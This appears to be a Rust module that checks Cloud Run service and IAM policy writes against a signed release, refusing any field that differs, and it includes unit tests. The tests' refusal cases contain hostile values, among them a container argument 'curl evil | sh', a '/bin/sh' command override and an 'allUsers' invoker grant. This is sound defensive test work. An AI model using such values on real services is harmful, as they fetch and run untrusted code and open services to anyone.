//! The Cloud Run table: every field of the service a worker controller writes, and its rule.

use std::collections::BTreeMap;
use std::time::Duration;

use alien_error::AlienError;
use alien_gcp_clients::cloudrun::Service;
use alien_gcp_clients::iam::IamPolicy;
use serde_json::Value;

use super::env::check_env;
use super::{check_target, refused, CloudWrite, Facts};
use crate::cloud_run::{network_of, vpc_access, ServiceStore};
use crate::error::{ErrorData, Result};
use crate::fields::{check_whole, empty, free, is_empty, parse_strict, signed, Row};
use crate::function::StillNewest;

/// Check `write`, a Cloud Run write for `facts.workload`, against the table.
pub fn check_write(facts: &Facts<'_>, write: &CloudWrite) -> Result<()> {
    if let CloudWrite::SetServicePolicy { name, policy } = write {
        return check_policy_write(facts, name, policy);
    }
    let (operation, named, service) = match write {
        CloudWrite::CreateService {
            service_id,
            service,
        } => ("CreateService", service_id.as_str(), service),
        CloudWrite::ReplaceService { name, service } => ("ReplaceService", name.as_str(), service),
        other => {
            return Err(refused(format!(
                "Cloud Run takes no {} write",
                other.operation()
            )))
        }
    };
    parse_strict::<Service>(operation, service)?;
    check_target(facts, named, operation)?;
    // Both make the whole service: a create, and services.patch of the whole service.
    check_whole(operation, service, &service_rows(facts))
}

/// The role a private service's own account needs: Pub/Sub and Cloud Scheduler sign their
/// requests as it.
const INVOKER: &str = "roles/run.invoker";

/// A policy write is only for a private worker, whose own account must be able to invoke it.
/// What else it may change depends on the live policy, so [`forward`] checks the rest.
fn check_policy_write(facts: &Facts<'_>, named: &str, policy: &Value) -> Result<()> {
    let operation = "SetServicePolicy";
    parse_strict::<IamPolicy>(operation, policy)?;
    check_target(facts, named, operation)?;
    if is_public(facts)? {
        return Err(refused(format!(
            "{operation} on {named}: the worker is public, so its service takes no invoker grant"
        )));
    }
    Ok(())
}

/// The account the workload's service runs as, which setup created for its permission profile.
fn own_account(facts: &Facts<'_>) -> std::result::Result<String, String> {
    let profile = facts
        .workload
        .identity
        .as_deref()
        .ok_or_else(|| "the workload names no permission profile".to_string())?;
    Ok(facts.place.run_as(profile))
}

/// Every (role, condition, member) a policy grants.
fn grants(policy: &Value) -> std::collections::BTreeSet<(String, String, String)> {
    policy["bindings"]
        .as_array()
        .into_iter()
        .flatten()
        .flat_map(|binding| {
            let role = binding["role"].as_str().unwrap_or_default().to_string();
            let condition = binding["condition"].to_string();
            binding["members"]
                .as_array()
                .into_iter()
                .flatten()
                .map(move |member| {
                    (
                        role.clone(),
                        condition.clone(),
                        member.as_str().unwrap_or_default().to_string(),
                    )
                })
        })
        .collect()
}

/// `sent` may differ from `live`, the policy as it is now, only by granting the workload's own
/// account the invoker role without a condition; it carries the etag it was read at.
fn check_policy(facts: &Facts<'_>, live: &Value, sent: &Value) -> Result<()> {
    let account = own_account(facts).map_err(refused)?;
    let mut allowed = grants(live);
    allowed.insert((
        INVOKER.to_string(),
        Value::Null.to_string(),
        format!("serviceAccount:{account}"),
    ));
    let sent_grants = grants(sent);
    if let Some((role, condition, member)) = sent_grants.difference(&allowed).next() {
        return Err(refused(format!(
            "SetServicePolicy on {} grants {member} {role} (condition {condition}); it may only let the worker's own account {account} invoke it",
            facts.own_name
        )));
    }
    if let Some((role, _, member)) = grants(live).difference(&sent_grants).next() {
        return Err(refused(format!(
            "SetServicePolicy on {} drops {member} from {role}, which only setup changes",
            facts.own_name
        )));
    }
    for field in ["etag", "version", "auditConfigs"] {
        if sent[field] != live[field] {
            return Err(refused(format!(
                "SetServicePolicy on {} has {field} {}, the policy has {}",
                facts.own_name, sent[field], live[field]
            )));
        }
    }
    Ok(())
}

/// The ingress the signed stack gives the workload.
fn ingress(public: bool) -> &'static str {
    if public {
        "INGRESS_TRAFFIC_ALL"
    } else {
        "INGRESS_TRAFFIC_INTERNAL_ONLY"
    }
}

fn is_public(facts: &Facts<'_>) -> Result<bool> {
    Ok(crate::plan::signed_worker(
        &facts.accepted.release.body,
        facts.place,
        &facts.workload.name,
    )?
    .is_some_and(|worker| !worker.public_endpoints.is_empty()))
}

fn service_rows<'a>(facts: &'a Facts<'a>) -> Vec<Row<'a>> {
    vec![
        // Left out, the service is the one the request names (its id or path), checked first.
        signed("/name", move |value| {
            if value.is_null() {
                return Ok(());
            }
            let name = value.as_str().unwrap_or_default();
            (name.rsplit('/').next() == Some(facts.own_name.as_str()))
                .then_some(())
                .ok_or_else(|| format!("it names {name}"))
        }),
        signed("/ingress", move |value| {
            let public = is_public(facts).map_err(|error| error.to_string())?;
            (value.as_str() == Some(ingress(public)))
                .then_some(())
                .ok_or_else(|| {
                    format!(
                        "it is {value}, the signed stack makes it {}",
                        ingress(public)
                    )
                })
        }),
        signed("/invokerIamDisabled", move |value| {
            let public = is_public(facts).map_err(|error| error.to_string())?;
            (value.as_bool().unwrap_or(false) == public)
                .then_some(())
                .ok_or_else(|| {
                    format!(
                        "it is {value}, and the worker is {}",
                        if public { "public" } else { "private" }
                    )
                })
        }),
        // Every request goes to the revision this template creates; no older revision stays
        // reachable by a split or a tag.
        signed("/traffic", |value| {
            (value == &serde_json::json!([{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100}]))
                .then_some(())
                .ok_or_else(|| format!("it is {value}"))
        }),
        signed("/template/serviceAccount", move |value| {
            let account = own_account(facts)?;
            (value.as_str() == Some(account.as_str()))
                .then_some(())
                .ok_or_else(|| format!("it is {value}, not {account}"))
        }),
        signed("/template/vpcAccess", move |value| {
            let expected = facts
                .place
                .vpc
                .as_ref()
                .and_then(|vpc| network_of(&vpc_access(vpc)));
            (network_of(value) == expected)
                .then_some(())
                .ok_or_else(|| format!("it is {value}, not the network setup gives functions"))
        }),
        signed("/template/containers", move |value| {
            check_containers(facts, value)
        }),
        empty("/template/volumes"),
        empty("/template/encryptionKey"),
        empty("/binaryAuthorization"),
        free("/description"),
        free("/labels"),
        free("/annotations"),
        free("/etag"),
        free("/template/revision"),
        free("/template/labels"),
        free("/template/annotations"),
        free("/template/scaling"),
        free("/template/timeout"),
        free("/template/executionEnvironment"),
        free("/template/maxInstanceRequestConcurrency"),
        free("/scaling"),
    ]
}

/// Exactly one container: the signed image, no command of its own, the signed env.
fn check_containers(facts: &Facts<'_>, value: &Value) -> std::result::Result<(), String> {
    let containers = value.as_array().cloned().unwrap_or_default();
    let [container] = containers.as_slice() else {
        return Err(format!(
            "it has {} containers, a worker runs one",
            containers.len()
        ));
    };
    let rows = vec![
        signed("/image", |value| {
            let digest = facts
                .workload
                .image
                .rsplit_once('@')
                .map(|(_, digest)| digest.to_string())
                .unwrap_or_default();
            match value.as_str().and_then(|image| image.rsplit_once('@')) {
                Some((repository, sent)) if !repository.is_empty() && sent == digest => Ok(()),
                _ => Err(format!("image {value} is not the signed digest {digest}")),
            }
        }),
        signed("/env", |value| {
            let mut env = BTreeMap::new();
            for item in value.as_array().into_iter().flatten() {
                let name = item["name"].as_str().unwrap_or_default().to_string();
                // A value read from a secret is something the release didn't sign.
                if !is_empty(&item["valueSource"]) {
                    return Err(format!("env {name} is read from a secret"));
                }
                env.insert(name, item["value"].as_str().unwrap_or_default().to_string());
            }
            check_env(
                facts.place,
                facts.accepted,
                facts.workload,
                facts.reads,
                &facts.own_name,
                &env,
            )
            .map_err(|error| error.to_string())
        }),
        empty("/command"),
        empty("/args"),
        empty("/volumeMounts"),
        empty("/workingDir"),
        free("/name"),
        free("/resources"),
        free("/ports"),
    ];
    check_whole("Cloud Run container", container, &rows).map_err(|error| error.to_string())
}

const UPDATE_WAIT: Duration = Duration::from_secs(300);
const POLL: Duration = Duration::from_secs(3);

/// Send `write`, already checked, to Cloud Run as it is, checking `newest` right before; wait
/// for the service to settle and read back what decides what runs.
pub async fn forward(
    store: &dyn ServiceStore,
    facts: &Facts<'_>,
    write: &CloudWrite,
    newest: &dyn StillNewest,
) -> Result<Value> {
    let service = match write {
        CloudWrite::CreateService { service, .. } => {
            newest.check().await?;
            store.create(&facts.own_name, service).await?;
            service
        }
        CloudWrite::ReplaceService { service, .. } => {
            newest.check().await?;
            store.replace(&facts.own_name, service).await?;
            service
        }
        CloudWrite::SetServicePolicy { policy, .. } => {
            let live = store.policy(&facts.own_name).await?;
            check_policy(facts, &live, policy)?;
            newest.check().await?;
            store.set_policy(&facts.own_name, policy).await?;
            return Ok(Value::Null);
        }
        other => {
            return Err(refused(format!(
                "Cloud Run takes no {} write",
                other.operation()
            )))
        }
    };
    let deadline = tokio::time::Instant::now() + UPDATE_WAIT;
    loop {
        let read = store.get(&facts.own_name).await?;
        if !read["reconciling"].as_bool().unwrap_or(false) {
            check_written(facts, service, &read)?;
            return Ok(Value::Null);
        }
        if tokio::time::Instant::now() > deadline {
            return Err(AlienError::new(ErrorData::CloudCallFailed {
                operation: format!("waiting for service {} to finish updating", facts.own_name),
            }));
        }
        tokio::time::sleep(POLL).await;
    }
}

/// Check that `read`, the service as Cloud Run answers after the write, runs what `sent` asked:
/// the image, account, env, ingress and invoker check, all traffic on the revision it created.
pub fn check_written(facts: &Facts<'_>, sent: &Value, read: &Value) -> Result<()> {
    let mismatch = |reason: String| {
        AlienError::new(ErrorData::ReadBackMismatch {
            function: facts.own_name.clone(),
            reason,
        })
    };
    let container = |service: &Value| service["template"]["containers"][0].clone();
    for field in ["image", "env", "command", "args"] {
        let (a, b) = (&container(sent)[field], &container(read)[field]);
        if a != b && !(is_empty(a) && is_empty(b)) {
            return Err(mismatch(format!("its container's {field} is {b}")));
        }
    }
    if read["template"]["serviceAccount"] != sent["template"]["serviceAccount"] {
        return Err(mismatch(format!(
            "it runs as {}",
            read["template"]["serviceAccount"]
        )));
    }
    if read["ingress"] != sent["ingress"]
        || read["invokerIamDisabled"].as_bool().unwrap_or(false)
            != sent["invokerIamDisabled"].as_bool().unwrap_or(false)
    {
        return Err(mismatch(format!(
            "its ingress is {} with invokerIamDisabled {}",
            read["ingress"], read["invokerIamDisabled"]
        )));
    }
    crate::cloud_run::check_serving(read).map_err(mismatch)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures::*;
    use crate::plan::{functions, Place, Reads};
    use crate::trust::tests::{found, MemoryStore};
    use crate::trust::{accept, Accepted};
    use alien_signing::{InstallId, SignedStatement};
    use serde_json::json;

    /// A change to a request, for a refusal case.
    type Change = Box<dyn Fn(&mut Value)>;

    fn place() -> Place {
        Place {
            install: InstallId::Gcp {
                project: "acme-project".to_string(),
                prefix: PREFIX.to_string(),
            },
            prefix: PREFIX.to_string(),
            vpc: None,
            machine_network: None,
        }
    }

    fn own() -> String {
        format!("{PREFIX}-api")
    }

    /// Release 1 of the `api` function for GCP.
    fn gcp_release() -> SignedStatement {
        let mut body = release_body(vec![function_workload()]);
        body.platform = "gcp".to_string();
        signed_release(1, &body)
    }

    async fn accepted(release: SignedStatement) -> Accepted {
        let install = found(&MemoryStore::protected(&settings())).await.unwrap();
        accept(&install, &[signer_list()], &release, None, "gcp", now()).unwrap()
    }

    /// The service as the controller builds it for the signed private `api` workload.
    fn service() -> Value {
        json!({
            "description": "Runtime worker: api",
            "labels": {"resource-type": "worker", "resource": "api", "deployment": PREFIX},
            "ingress": "INGRESS_TRAFFIC_INTERNAL_ONLY",
            "invokerIamDisabled": false,
            "traffic": [{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100}],
            "template": {
                "labels": {"worker": "api"},
                "scaling": {"minInstanceCount": 0},
                "timeout": "30s",
                "serviceAccount": place().run_as("execution"),
                "executionEnvironment": "EXECUTION_ENVIRONMENT_GEN2",
                "maxInstanceRequestConcurrency": 1000,
                "containers": [{
                    "name": "worker",
                    "image": format!("us-central1-docker.pkg.dev/acme/app/api@{DIGEST}"),
                    "env": [
                        {"name": "ALIEN_DEPLOYMENT_ID", "value": "dep_1"},
                        {"name": "MODE", "value": "signed"},
                    ],
                    "resources": {"limits": {"memory": "512Mi"}, "cpuIdle": true, "startupCpuBoost": true},
                    "ports": [{"name": "http1", "containerPort": 8080}],
                }],
            },
        })
    }

    async fn checked(write: CloudWrite) -> std::result::Result<(), String> {
        let accepted = accepted(gcp_release()).await;
        let place = place();
        let reads = Reads::default();
        let workload = functions(&accepted.release.body).next().unwrap();
        let facts = Facts {
            place: &place,
            accepted: &accepted,
            workload,
            reads: &reads,
            own_name: own(),
        };
        check_write(&facts, &write).map_err(|error| error.to_string())
    }

    fn create(service: Value) -> CloudWrite {
        CloudWrite::CreateService {
            service_id: own(),
            service,
        }
    }

    #[tokio::test]
    async fn the_controllers_service_passes() {
        checked(create(service())).await.unwrap();
        // Scaling, resources, startup boost, ports, timeout, concurrency, labels are free.
        let mut bigger = service();
        bigger["template"]["scaling"] = json!({"minInstanceCount": 2, "maxInstanceCount": 50});
        bigger["template"]["containers"][0]["resources"] =
            json!({"limits": {"memory": "4Gi", "cpu": "2"}});
        bigger["template"]["timeout"] = json!("900s");
        bigger["template"]["labels"]["alien-image-pull-retry"] = json!("2");
        checked(create(bigger)).await.unwrap();
        // An update names the full resource and carries the live etag.
        let mut update = service();
        update["name"] = json!(format!(
            "projects/acme-project/locations/us-central1/services/{}",
            own()
        ));
        update["etag"] = json!("\"abc\"");
        checked(CloudWrite::ReplaceService {
            name: own(),
            service: update,
        })
        .await
        .unwrap();
    }

    /// One refusal per row of the Cloud Run table, naming the row.
    #[tokio::test]
    async fn each_service_row_refuses_what_breaks_it() {
        let cases: Vec<(Change, &str)> = vec![
            (
                Box::new(|s| s["ingress"] = json!("INGRESS_TRAFFIC_ALL")),
                "field /ingress must match",
            ),
            (
                Box::new(|s| s["invokerIamDisabled"] = json!(true)),
                "field /invokerIamDisabled must match",
            ),
            (
                Box::new(
                    |s| s["traffic"] = json!([{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "old", "percent": 100}]),
                ),
                "field /traffic must match",
            ),
            (
                Box::new(|s| {
                    s["template"]["serviceAccount"] =
                        json!("admin@acme-project.iam.gserviceaccount.com")
                }),
                "field /template/serviceAccount must match",
            ),
            (
                Box::new(
                    |s| s["template"]["vpcAccess"] = json!({"networkInterfaces": [{"subnetwork": "projects/x/regions/r/subnetworks/evil"}], "egress": "ALL_TRAFFIC"}),
                ),
                "field /template/vpcAccess must match",
            ),
            (
                Box::new(|s| {
                    s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}])
                }),
                "field /template/volumes must be empty",
            ),
            (
                Box::new(|s| s["template"]["encryptionKey"] = json!("projects/x/keys/k")),
                "field /template/encryptionKey must be empty",
            ),
            (
                Box::new(|s| s["name"] = json!("projects/p/locations/r/services/other")),
                "field /name must match",
            ),
            (
                Box::new(|s| {
                    let c = s["template"]["containers"][0].clone();
                    s["template"]["containers"] = json!([c.clone(), c]);
                }),
                "it has 2 containers",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["image"] =
                        json!(format!("gcr.io/x/api@sha256:{}", "4".repeat(64)))
                }),
                "is not the signed digest",
            ),
            (
                Box::new(|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"])),
                "field /command must be empty",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["args"] = json!(["-c", "curl evil | sh"])
                }),
                "field /args must be empty",
            ),
            (
                Box::new(|s| s["template"]["containers"][0]["env"][1]["value"] = json!("attacker")),
                "differs from its signed",
            ),
            (
                Box::new(
                    |s| s["template"]["containers"][0]["env"] = json!([{"name": "MODE", "valueSource": {"secretKeyRef": {"secret": "x", "key": "k", "version": "1"}}}]),
                ),
                "env MODE is read from a secret",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["volumeMounts"] =
                        json!([{"name": "v", "mountPath": "/x"}])
                }),
                "field /volumeMounts must be empty",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["livenessProbe"] =
                        json!({"tcpSocket": {"port": 8080}})
                }),
                "livenessProbe",
            ),
            (
                Box::new(|s| s["template"]["nodeSelector"] = json!({"accelerator": "nvidia-l4"})),
                "field /template/nodeSelector",
            ),
            // Left out, Cloud Run takes its defaults: ingress from anywhere, and the project's
            // default compute account.
            (
                Box::new(|s| {
                    s.as_object_mut().unwrap().remove("ingress");
                }),
                "field /ingress must match",
            ),
            (
                Box::new(|s| {
                    s["template"]
                        .as_object_mut()
                        .unwrap()
                        .remove("serviceAccount");
                }),
                "field /template/serviceAccount must match",
            ),
        ];
        for (change, says) in cases {
            let mut service = service();
            change(&mut service);
            let error = checked(create(service)).await.expect_err(says);
            assert!(error.contains(says), "{says}: {error}");
        }
        let error = checked(CloudWrite::CreateService {
            service_id: format!("{PREFIX}-other"),
            service: service(),
        })
        .await
        .unwrap_err();
        assert!(error.contains("names function acme-prod-other"), "{error}");
    }

    /// The service's IAM policy, as Cloud Run holds it; nothing else is called.
    struct Policies {
        policy: std::sync::Mutex<Value>,
        set: std::sync::Mutex<Vec<Value>>,
    }

    #[async_trait::async_trait]
    impl ServiceStore for Policies {
        async fn get(&self, name: &str) -> Result<Value> {
            panic!("get {name}")
        }
        async fn replace(&self, name: &str, _service: &Value) -> Result<()> {
            panic!("replace {name}")
        }
        async fn create(&self, name: &str, _service: &Value) -> Result<()> {
            panic!("create {name}")
        }
        async fn policy(&self, name: &str) -> Result<Value> {
            assert_eq!(name, own());
            Ok(self.policy.lock().unwrap().clone())
        }
        async fn set_policy(&self, name: &str, policy: &Value) -> Result<()> {
            assert_eq!(name, own());
            self.set.lock().unwrap().push(policy.clone());
            Ok(())
        }
    }

    struct Newest;

    #[async_trait::async_trait]
    impl StillNewest for Newest {
        async fn check(&self) -> Result<()> {
            Ok(())
        }
    }

    /// Send a SetServicePolicy of `sent` against the live policy `live`; what was set, or the
    /// refusal.
    async fn set_policy(live: Value, sent: Value) -> std::result::Result<Vec<Value>, String> {
        let accepted = accepted(gcp_release()).await;
        let place = place();
        let reads = Reads::default();
        let workload = functions(&accepted.release.body).next().unwrap();
        let facts = Facts {
            place: &place,
            accepted: &accepted,
            workload,
            reads: &reads,
            own_name: own(),
        };
        let write = CloudWrite::SetServicePolicy {
            name: own(),
            policy: sent,
        };
        let store = Policies {
            policy: std::sync::Mutex::new(live),
            set: std::sync::Mutex::new(Vec::new()),
        };
        check_write(&facts, &write).map_err(|error| error.to_string())?;
        forward(&store, &facts, &write, &Newest)
            .await
            .map_err(|error| error.to_string())?;
        Ok(store.set.into_inner().unwrap())
    }

    fn own_invoker() -> String {
        format!("serviceAccount:{}", place().run_as("execution"))
    }

    /// The policy write may only let the worker's own account invoke its service, on top of the
    /// policy as it is.
    #[tokio::test]
    async fn a_policy_write_only_admits_the_workers_own_account() {
        let live = json!({
            "version": 1,
            "etag": "BwX1",
            "bindings": [{"role": "roles/run.invoker", "members": ["serviceAccount:scheduler@acme-project.iam.gserviceaccount.com"]}],
        });
        let admitted = json!({
            "version": 1,
            "etag": "BwX1",
            "bindings": [{"role": "roles/run.invoker", "members": [
                "serviceAccount:scheduler@acme-project.iam.gserviceaccount.com",
                own_invoker(),
            ]}],
        });
        assert_eq!(
            set_policy(live.clone(), admitted.clone()).await.unwrap(),
            vec![admitted.clone()],
            "Cloud Run got exactly the controller's policy"
        );
        // The same grant in a binding of its own.
        let own_binding = json!({
            "version": 1,
            "etag": "BwX1",
            "bindings": [
                live["bindings"][0].clone(),
                {"role": "roles/run.invoker", "members": [own_invoker()]},
            ],
        });
        set_policy(live.clone(), own_binding).await.unwrap();

        let with = |change: &dyn Fn(&mut Value)| {
            let mut policy = admitted.clone();
            change(&mut policy);
            policy
        };
        let cases: Vec<(Value, &str)> = vec![
            (
                with(&|p| p["bindings"][0]["members"][1] = json!("allUsers")),
                "grants allUsers roles/run.invoker",
            ),
            (
                with(&|p| p["bindings"][0]["role"] = json!("roles/run.admin")),
                "roles/run.admin",
            ),
            (
                with(&|p| {
                    p["bindings"][0]["condition"] =
                        json!({"expression": "request.time < timestamp('2030-01-01T00:00:00Z')"})
                }),
                "grants serviceAccount:",
            ),
            (
                with(&|p| p["bindings"][0]["members"] = json!([own_invoker()])),
                "drops serviceAccount:scheduler@acme-project.iam.gserviceaccount.com",
            ),
            (with(&|p| p["etag"] = json!("BwX0")), "has etag \"BwX0\""),
            (
                with(&|p| p["auditConfigs"] = json!([{"service": "allServices"}])),
                "field /auditConfigs, which the verifier doesn't know",
            ),
        ];
        for (sent, says) in cases {
            let error = set_policy(live.clone(), sent).await.expect_err(says);
            assert!(error.contains(says), "{says}: {error}");
        }
    }

    /// A public worker's service takes requests without the invoker check, so it gets no
    /// policy write; nor does another function's.
    #[tokio::test]
    async fn a_policy_write_is_for_the_own_private_service_only() {
        for (release, named, says) in [
            (
                crate::plan::tests::release_on(alien_core::Platform::Gcp, true),
                own(),
                "the worker is public, so its service takes no invoker grant",
            ),
            (
                crate::plan::tests::release_on(alien_core::Platform::Gcp, false),
                format!("{PREFIX}-other"),
                "names function acme-prod-other",
            ),
        ] {
            let accepted = accepted(release).await;
            let place = place();
            let reads = Reads::default();
            let facts = Facts {
                place: &place,
                accepted: &accepted,
                workload: functions(&accepted.release.body).next().unwrap(),
                reads: &reads,
                own_name: own(),
            };
            let error = check_write(
                &facts,
                &CloudWrite::SetServicePolicy {
                    name: named,
                    policy: json!({"bindings": [{"role": INVOKER, "members": [own_invoker()]}]}),
                },
            )
            .unwrap_err()
            .to_string();
            assert!(error.contains(says), "{says}: {error}");
        }
    }
}
